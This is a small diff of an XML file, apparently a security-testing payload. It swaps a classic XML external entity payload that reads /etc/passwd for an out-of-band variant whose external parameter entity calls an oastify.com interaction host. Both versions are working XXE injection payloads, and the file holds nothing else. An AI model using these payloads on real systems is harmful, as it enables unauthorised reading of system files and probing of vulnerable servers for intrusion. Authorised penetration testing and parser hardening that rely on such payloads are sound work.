@@ -1,1 +1,6 @@
-<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY % ext SYSTEM "http://y43kj4wf3b9y6suql8cb3hkkcbi26vuk.oastify.com">
+  %ext;
+]>
+<root><data>test</data></root>
